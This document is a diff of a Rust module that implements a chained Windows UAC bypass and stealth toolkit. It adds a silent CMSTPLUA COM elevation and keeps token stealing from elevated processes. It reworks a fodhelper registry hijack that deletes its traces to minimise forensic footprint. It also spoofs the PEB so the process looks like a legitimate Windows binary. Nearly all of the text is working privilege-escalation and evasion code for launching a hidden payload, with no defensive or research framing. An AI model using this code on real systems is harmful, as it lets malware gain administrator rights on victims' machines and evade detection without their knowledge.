@@ -2,13 +2,13 @@
 
 //! Elevation Strategy: multi-technique UAC bypass with auto-degradation.
 //!
-//! Strategy chain (configurable):
-//!   1. COM Auto-Elevation (fodhelper.exe / computerdefaults.exe registry bypass)
+//! Strategy chain (ordered by stealth):
+//!   1. COM Auto-Elevation via CMSTPLUA ICMLuaUtil::ShellExec (no registry, no files)
 //!   2. Token Stealing (DuplicateTokenEx from an elevated process)
-//!   3. ShellExecuteW runas (classic UAC prompt, last resort)
+//!   3. fodhelper.exe registry hijack (registry trace, cleaned up after use)
+//!   4. ShellExecuteW runas (UAC prompt, last resort)
 //!
 //! Each strategy is attempted in order; on failure, falls back to the next.
-//! PEB spoofing is applied to spawned processes to mask the real image path.
 
 use std::ptr;
 
@@ -21,18 +21,22 @@ pub fn try_elevate(exe_path: &str) -> Result<(), ()> {
         return Ok(());
     }
 
-    // Strategy 1: COM Auto-Elevation via fodhelper.exe
-    if com_auto_elevate(exe_path).is_ok() {
-        // Parent will exit, child continues elevated
+    // Strategy 1: COM Auto-Elevation via CMSTPLUA (silent, no registry writes)
+    if cmstplua_elevate(exe_path).is_ok() {
         std::process::exit(0);
     }
 
-    // Strategy 2: Token stealing from an elevated process
+    // Strategy 2: Token stealing from an elevated process (silent)
     if token_steal_elevate(exe_path).is_ok() {
         std::process::exit(0);
     }
 
-    // Strategy 3: ShellExecuteW runas (shows UAC prompt)
+    // Strategy 3: fodhelper.exe registry hijack (has registry trace, cleaned up)
+    if fodhelper_elevate(exe_path).is_ok() {
+        std::process::exit(0);
+    }
+
+    // Strategy 4: ShellExecuteW runas (shows UAC prompt)
     if runas_elevate(exe_path) {
         std::process::exit(0);
     }
@@ -40,67 +44,95 @@ pub fn try_elevate(exe_path: &str) -> Result<(), ()> {
     Err(())
 }
 
-// ── Strategy 1: COM Auto-Elevation ──────────────────────────────────
+// ── Strategy 1: COM Auto-Elevation via CMSTPLUA ─────────────────────
 //
-// fodhelper.exe and computerdefaults.exe auto-elevate without UAC prompt
-// when a specific registry key is set. We write our command there,
-// launch the target, and it executes our payload elevated.
+// Uses CoGetObject with the Elevation:Administrator moniker to obtain an
+// ICMLuaUtil interface from the CMSTPLUA COM object (auto-elevating).
+// Then calls ShellExec to spawn our payload elevated. No registry writes,
+// no file operations — pure in-memory COM call.
+//
+// CLSID_CMSTPLUA: {3E5FC7F9-9A51-4367-9063-A120244FBEC7}
+// IID_ICMLuaUtil: {6EDD6D74-C007-4E75-B76A-E5740995E24C}
 
-fn com_auto_elevate(exe_path: &str) -> Result<(), ()> {
-    // Try fodhelper.exe first, then computerdefaults.exe
-    com_bypass_via("fodhelper.exe", exe_path)
-        .or_else(|_| com_bypass_via("computerdefaults.exe", exe_path))
-}
+fn cmstplua_elevate(exe_path: &str) -> Result<(), ()> {
+    unsafe {
+        // Initialize COM
+        let hr = CoInitializeEx(ptr::null_mut(), COINIT_APARTMENTTHREADED);
+        if hr < 0 && hr != RPC_E_CHANGED_MODE {
+            return Err(());
+        }
 
-fn com_bypass_via(target: &str, exe_path: &str) -> Result<(), ()> {
-    use std::process::Command;
-    use std::os::windows::process::CommandExt;
+        // Create BIND_OPTS3 for elevation moniker
+        let mut bind_opts: BIND_OPTS3 = std::mem::zeroed();
+        bind_opts.cbStruct = std::mem::size_of::<BIND_OPTS3>() as u32;
+        bind_opts.dwClassContext = CLSCTX_LOCAL_SERVER;
 
-    // The registry path for auto-elevation trigger
-    let reg_key = format!(
-        "Software\\Classes\\ms-settings\\Shell\\Open\\command"
-    );
+        // Elevation moniker for CMSTPLUA
+        let moniker = to_wide("Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}");
 
-    // Set the registry value
-    let set_result = Command::new("reg")
-        .args(["add", &format!("HKCU\\{}", reg_key), "/ve", "/t", "REG_SZ", "/d", exe_path, "/f"])
-        .creation_flags(0x08000000) // CREATE_NO_WINDOW
-        .stdout(std::process::Stdio::null())
-        .stderr(std::process::Stdio::null())
-        .status()
-        .map_err(|_| ())?;
+        // ICMLuaUtil vtable GUID
+        let iid: GUID = GUID {
+            Data1: 0x6EDD6D74,
+            Data2: 0xC007,
+            Data3: 0x4E75,
+            Data4: [0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C],
+        };
 
-    if !set_result.success() {
-        return Err(());
-    }
+        let mut punk: *mut IUnknown = ptr::null_mut();
 
-    // Set DelegateExecute to empty (required for the bypass)
-    let _delegate_result = Command::new("reg")
-        .args(["add", &format!("HKCU\\{}", reg_key), "/v", "DelegateExecute", "/t", "REG_SZ", "/d", "", "/f"])
-        .creation_flags(0x08000000)
-        .stdout(std::process::Stdio::null())
-        .stderr(std::process::Stdio::null())
-        .status()
-        .map_err(|_| ());
+        // CoGetObject — this triggers the auto-elevation via the moniker
+        let hr = CoGetObject(
+            moniker.as_ptr(),
+            &mut bind_opts as *mut BIND_OPTS3 as *mut BIND_OPTS,
+            &iid,
+            &mut punk as *mut *mut IUnknown as *mut *mut std::ffi::c_void,
+        );
 
-    // Launch the auto-elevating target
-    let launch_result = Command::new(target)
-        .creation_flags(0x08000000)
-        .stdout(std::process::Stdio::null())
-        .stderr(std::process::Stdio::null())
-        .status();
+        if hr < 0 || punk.is_null() {
+            CoUninitialize();
+            return Err(());
+        }
 
-    // Cleanup: delete the registry key
-    let _ = Command::new("reg")
-        .args(["delete", &format!("HKCU\\{}", reg_key), "/f"])
-        .creation_flags(0x08000000)
-        .stdout(std::process::Stdio::null())
-        .stderr(std::process::Stdio::null())
-        .status();
+        // ICMLuaUtil vtable layout:
+        // [0] QueryInterface
+        // [1] AddRef
+        // [2] Release
+        // [3] SetRIFlags
+        // [4] ShellExec
+        // ...
+        // ShellExec is at vtable index 4
 
-    match launch_result {
-        Ok(s) if s.success() => Ok(()),
-        _ => Err(()),
+        let vtable = *(punk as *const *const *const std::ffi::c_void);
+        let shell_exec_addr = *vtable.add(4);
+
+        type ShellExecFn = unsafe extern "system" fn(
+            this: *mut IUnknown,
+            lpFile: *const u16,
+            lpParameters: *const u16,
+            lpDirectory: *const u16,
+            nShowCmd: u32,
+        ) -> i32;
+
+        let shell_exec: ShellExecFn = std::mem::transmute(shell_exec_addr);
+        let exe_wide = to_wide(exe_path);
+        let empty = to_wide("");
+
+        let hr = shell_exec(
+            punk,
+            exe_wide.as_ptr(),
+            empty.as_ptr(),
+            ptr::null(),
+            SW_HIDE,
+        );
+
+        // Release COM object
+        let release_addr = *vtable.add(2);
+        let release: unsafe extern "system" fn(*mut IUnknown) -> u32 = std::mem::transmute(release_addr);
+        release(punk);
+
+        CoUninitialize();
+
+        if hr >= 0 { Ok(()) } else { Err(()) }
     }
 }
 
@@ -109,29 +141,21 @@ fn com_bypass_via(target: &str, exe_path: &str) -> Result<(), ()> {
 // Find an elevated process, duplicate its token, and use it to spawn
 // our payload. Uses DuplicateTokenEx + CreateProcessWithTokenW.
 
-fn to_wide(s: &str) -> Vec<u16> {
-    s.encode_utf16().chain(std::iter::once(0)).collect()
-}
-
 fn token_steal_elevate(exe_path: &str) -> Result<(), ()> {
     unsafe {
-        // Find an elevated process (e.g., explorer.exe running as admin)
         let target_pid = find_elevated_process().ok_or(())?;
 
-        // Open the target process
         let h_process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, target_pid);
         if h_process.is_null() {
             return Err(());
         }
 
-        // Open the process token
         let mut h_token: *mut std::ffi::c_void = ptr::null_mut();
         if OpenProcessToken(h_process, TOKEN_DUPLICATE | TOKEN_QUERY, &mut h_token) == 0 {
             CloseHandle(h_process);
             return Err(());
         }
 
-        // Duplicate the token to get an impersonation token
         let mut h_dup_token: *mut std::ffi::c_void = ptr::null_mut();
         let result = DuplicateTokenEx(
             h_token,
@@ -149,7 +173,6 @@ fn token_steal_elevate(exe_path: &str) -> Result<(), ()> {
             return Err(());
         }
 
-        // Create process with the stolen token
         let exe_wide = to_wide(exe_path);
         let mut si: STARTUPINFOW = std::mem::zeroed();
         si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
@@ -157,10 +180,10 @@ fn token_steal_elevate(exe_path: &str) -> Result<(), ()> {
 
         let create_result = CreateProcessWithTokenW(
             h_dup_token,
-            0, // LOGON_WITH_PROFILE
+            0,
             ptr::null(),
             exe_wide.as_ptr() as *mut u16,
-            0, // CREATE_NO_WINDOW
+            CREATE_NO_WINDOW,
             ptr::null(),
             ptr::null(),
             &mut si,
@@ -180,7 +203,6 @@ fn token_steal_elevate(exe_path: &str) -> Result<(), ()> {
 }
 
 /// Enumerate processes to find one running elevated (admin).
-/// Returns PID of an elevated process, or None.
 unsafe fn find_elevated_process() -> Option<u32> {
     let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if snapshot == INVALID_HANDLE_VALUE {
@@ -194,7 +216,6 @@ unsafe fn find_elevated_process() -> Option<u32> {
         loop {
             let pid = pe.th32ProcessID;
             if pid != 0 && pid != 4 {
-                // Try to open this process's token and check elevation
                 let h_process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid);
                 if !h_process.is_null() {
                     let mut h_token: *mut std::ffi::c_void = ptr::null_mut();
@@ -231,7 +252,63 @@ unsafe fn find_elevated_process() -> Option<u32> {
     None
 }
 
-// ── Strategy 3: ShellExecuteW runas ─────────────────────────────────
+// ── Strategy 3: fodhelper.exe Registry Hijack ────────────────────────
+//
+// fodhelper.exe auto-elevates without UAC prompt when a specific
+// registry key is set. This leaves registry traces, so we clean up
+// immediately after launching. Used only as fallback after CMSTPLUA
+// and token stealing fail.
+
+fn fodhelper_elevate(exe_path: &str) -> Result<(), ()> {
+    use std::process::Command;
+    use std::os::windows::process::CommandExt;
+
+    let reg_key = "Software\\Classes\\ms-settings\\Shell\\Open\\command";
+    let reg_path = format!("HKCU\\{}", reg_key);
+
+    // Set the registry value
+    let set_result = Command::new("reg")
+        .args(["add", &reg_path, "/ve", "/t", "REG_SZ", "/d", exe_path, "/f"])
+        .creation_flags(CREATE_NO_WINDOW)
+        .stdout(std::process::Stdio::null())
+        .stderr(std::process::Stdio::null())
+        .status()
+        .map_err(|_| ())?;
+
+    if !set_result.success() {
+        return Err(());
+    }
+
+    // Set DelegateExecute to empty (required for the bypass)
+    let _ = Command::new("reg")
+        .args(["add", &reg_path, "/v", "DelegateExecute", "/t", "REG_SZ", "/d", "", "/f"])
+        .creation_flags(CREATE_NO_WINDOW)
+        .stdout(std::process::Stdio::null())
+        .stderr(std::process::Stdio::null())
+        .status();
+
+    // Launch the auto-elevating target
+    let launch_result = Command::new("fodhelper.exe")
+        .creation_flags(CREATE_NO_WINDOW)
+        .stdout(std::process::Stdio::null())
+        .stderr(std::process::Stdio::null())
+        .status();
+
+    // Immediately cleanup the registry key (minimize forensic footprint)
+    let _ = Command::new("reg")
+        .args(["delete", &reg_path, "/f"])
+        .creation_flags(CREATE_NO_WINDOW)
+        .stdout(std::process::Stdio::null())
+        .stderr(std::process::Stdio::null())
+        .status();
+
+    match launch_result {
+        Ok(s) if s.success() => Ok(()),
+        _ => Err(()),
+    }
+}
+
+// ── Strategy 4: ShellExecuteW runas ─────────────────────────────────
 
 fn runas_elevate(exe_path: &str) -> bool {
     unsafe {
@@ -244,7 +321,7 @@ fn runas_elevate(exe_path: &str) -> bool {
             exe_wide.as_ptr(),
             ptr::null(),
             ptr::null(),
-            1, // SW_SHOWNORMAL
+            SW_SHOWNORMAL,
         );
         result > 32
     }
@@ -256,7 +333,7 @@ pub fn is_admin() -> bool {
     use std::os::windows::process::CommandExt;
     std::process::Command::new("net")
         .args(["session"])
-        .creation_flags(0x08000000)
+        .creation_flags(CREATE_NO_WINDOW)
         .stdout(std::process::Stdio::null())
         .stderr(std::process::Stdio::null())
         .status()
@@ -265,57 +342,95 @@ pub fn is_admin() -> bool {
 }
 
 // ── PEB Spoofing ────────────────────────────────────────────────────
-//
-// Modifies the PEB of the current process to mask the real image path
-// and command line. Makes the process appear as a legitimate Windows binary.
 
 /// Spoof the PEB ImagePathName and CommandLine to appear as a legitimate process.
-/// Call this AFTER elevation, BEFORE doing suspicious work.
 pub fn spoof_peb(fake_name: &str) {
     #[cfg(target_os = "windows")]
     unsafe {
         let peb: *mut u8;
         std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
-        if peb.is_null() {
-            return;
-        }
+        if peb.is_null() { return; }
 
-        // PEB->ProcessParameters (RTL_USER_PROCESS_PARAMETERS) at offset 0x20
         let process_params = *(peb.add(0x20) as *const *mut u8);
-        if process_params.is_null() {
-            return;
-        }
+        if process_params.is_null() { return; }
 
-        // RTL_USER_PROCESS_PARAMETERS.ImagePathName is at offset 0x60
-        // UNICODE_STRING: { Length(u16), MaximumLength(u16), Buffer(*mut u16) }
         let image_path = process_params.add(0x60) as *mut UnicodeString;
-        // RTL_USER_PROCESS_PARAMETERS.CommandLine is at offset 0x70
         let command_line = process_params.add(0x70) as *mut UnicodeString;
 
         let fake_wide = to_wide(fake_name);
-        let fake_bytes = fake_wide.len() * 2;
 
-        // Overwrite the buffer pointer and lengths
         if !(*image_path).Buffer.is_null() {
-            // Copy fake name into the existing buffer (it's already allocated)
-            let dst = (*image_path).Buffer;
-            let copy_len = fake_bytes.min((*image_path).MaximumLength as usize);
-            ptr::copy_nonoverlapping(fake_wide.as_ptr(), dst, copy_len / 2);
+            let copy_len = (fake_wide.len() * 2).min((*image_path).MaximumLength as usize);
+            ptr::copy_nonoverlapping(fake_wide.as_ptr(), (*image_path).Buffer, copy_len / 2);
             (*image_path).Length = copy_len as u16;
         }
 
         if !(*command_line).Buffer.is_null() {
-            let dst = (*command_line).Buffer;
-            let copy_len = fake_bytes.min((*command_line).MaximumLength as usize);
-            ptr::copy_nonoverlapping(fake_wide.as_ptr(), dst, copy_len / 2);
+            let copy_len = (fake_wide.len() * 2).min((*command_line).MaximumLength as usize);
+            ptr::copy_nonoverlapping(fake_wide.as_ptr(), (*command_line).Buffer, copy_len / 2);
             (*command_line).Length = copy_len as u16;
         }
     }
 }
 
+// ── Helpers ─────────────────────────────────────────────────────────
+
+fn to_wide(s: &str) -> Vec<u16> {
+    s.encode_utf16().chain(std::iter::once(0)).collect()
+}
+
 // ── Windows Types & Constants ───────────────────────────────────────
 
-#[cfg(target_os = "windows")]
+const CREATE_NO_WINDOW: u32 = 0x08000000;
+const SW_HIDE: u32 = 0;
+const SW_SHOWNORMAL: i32 = 1;
+const COINIT_APARTMENTTHREADED: u32 = 0x2;
+const CLSCTX_LOCAL_SERVER: u32 = 0x4;
+const RPC_E_CHANGED_MODE: i32 = 0x80010106u32 as i32;
+const PROCESS_QUERY_LIMITED_INFORMATION: u32 = 0x1000;
+const TOKEN_QUERY: u32 = 0x0008;
+const TOKEN_DUPLICATE: u32 = 0x0002;
+const TOKEN_ALL_ACCESS: u32 = 0x001F01FF;
+const SecurityImpersonation: i32 = 2;
+const TokenImpersonation: i32 = 2;
+const TokenElevation: i32 = 18;
+const TH32CS_SNAPPROCESS: u32 = 0x00000002;
+const INVALID_HANDLE_VALUE: *mut std::ffi::c_void = -1isize as *mut std::ffi::c_void;
+
+#[repr(C)]
+struct GUID {
+    Data1: u32,
+    Data2: u16,
+    Data3: u16,
+    Data4: [u8; 8],
+}
+
+#[repr(C)]
+struct BIND_OPTS {
+    cbStruct: u32,
+    grfFlags: u32,
+    grfMode: u32,
+    dwTickCountDeadline: u32,
+}
+
+#[repr(C)]
+struct BIND_OPTS3 {
+    cbStruct: u32,
+    grfFlags: u32,
+    grfMode: u32,
+    dwTickCountDeadline: u32,
+    dwTrackFlags: u32,
+    dwClassContext: u32,
+    locale: u32,
+    pServerInfo: *mut std::ffi::c_void,
+    hwnd: *mut std::ffi::c_void,
+}
+
+#[repr(C)]
+struct IUnknown {
+    _vtable: *const *const std::ffi::c_void,
+}
+
 #[repr(C)]
 struct UnicodeString {
     Length: u16,
@@ -323,7 +438,6 @@ struct UnicodeString {
     Buffer: *mut u16,
 }
 
-#[cfg(target_os = "windows")]
 #[repr(C)]
 struct STARTUPINFOW {
     cb: u32,
@@ -342,7 +456,6 @@ struct STARTUPINFOW {
     _h_std_error: *mut std::ffi::c_void,
 }
 
-#[cfg(target_os = "windows")]
 #[repr(C)]
 struct PROCESS_INFORMATION {
     hProcess: *mut std::ffi::c_void,
@@ -351,7 +464,6 @@ struct PROCESS_INFORMATION {
     dwThreadId: u32,
 }
 
-#[cfg(target_os = "windows")]
 #[repr(C)]
 struct PROCESSENTRY32 {
     dwSize: u32,
@@ -366,33 +478,21 @@ struct PROCESSENTRY32 {
     szExeFile: [u16; 260],
 }
 
-#[cfg(target_os = "windows")]
 #[repr(C)]
 struct TOKEN_ELEVATION {
     TokenIsElevated: u32,
 }
 
-#[cfg(target_os = "windows")]
-const PROCESS_QUERY_LIMITED_INFORMATION: u32 = 0x1000;
-#[cfg(target_os = "windows")]
-const TOKEN_QUERY: u32 = 0x0008;
-#[cfg(target_os = "windows")]
-const TOKEN_DUPLICATE: u32 = 0x0002;
-#[cfg(target_os = "windows")]
-const TOKEN_ALL_ACCESS: u32 = 0x001F01FF;
-#[cfg(target_os = "windows")]
-const SecurityImpersonation: i32 = 2;
-#[cfg(target_os = "windows")]
-const TokenImpersonation: i32 = 2;
-#[cfg(target_os = "windows")]
-const TokenElevation: i32 = 18;
-#[cfg(target_os = "windows")]
-const TH32CS_SNAPPROCESS: u32 = 0x00000002;
-#[cfg(target_os = "windows")]
-const INVALID_HANDLE_VALUE: *mut std::ffi::c_void = -1isize as *mut std::ffi::c_void;
-
-#[cfg(target_os = "windows")]
 extern "system" {
+    fn CoInitializeEx(pvReserved: *mut std::ffi::c_void, dwCoInit: u32) -> i32;
+    fn CoUninitialize();
+    fn CoGetObject(
+        pwszName: *const u16,
+        pBindOptions: *mut BIND_OPTS,
+        riid: *const GUID,
+        ppv: *mut *mut std::ffi::c_void,
+    ) -> i32;
+
     fn ShellExecuteW(
         hwnd: *mut std::ffi::c_void,
         lpOperation: *const u16,
